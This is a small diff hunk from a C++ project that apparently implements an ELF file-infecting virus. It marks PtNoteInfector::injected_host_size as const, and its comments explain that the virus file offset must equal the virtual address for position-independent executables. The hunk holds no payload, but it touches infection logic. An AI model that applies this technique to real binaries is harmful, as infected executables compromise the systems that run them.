@@ -171,7 +171,7 @@ std::optional<InjectionResult> PtNoteInfector::inject(
   };
 }
 
-size_t PtNoteInfector::injected_host_size() {
+size_t PtNoteInfector::injected_host_size() const {
   // In order to make this work on PIEs, the virus file offset must equal to
   // vaddr. Therefore, the file size will be extended. Note that this is not
   // necessary for non-PIE but doing this makes both PIE and non-PIE handling
